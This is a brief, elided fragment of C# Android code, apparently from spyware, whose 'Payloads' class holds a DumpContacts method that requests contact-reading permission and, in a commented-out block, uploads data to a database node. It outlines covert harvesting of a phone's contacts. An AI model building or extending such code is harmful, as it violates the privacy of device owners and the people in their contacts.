...
namespace Surprise
{
    public partial class MainActivity
    {
        class Payloads
        {
            ...
            public void DumpContacts(MainActivity activity, ContactService_Android contactService_Android, Database database, string tempPath, int waitTime)
            {
                // Required Permissions
                string[] requiredPermissions = new string[] { Manifest.Permission.ReadContacts.ToString()
                                                             };
            ...
            /*
                ...
                // Uplaodng to Data Base
                database.CreateNode("app", "working012212");
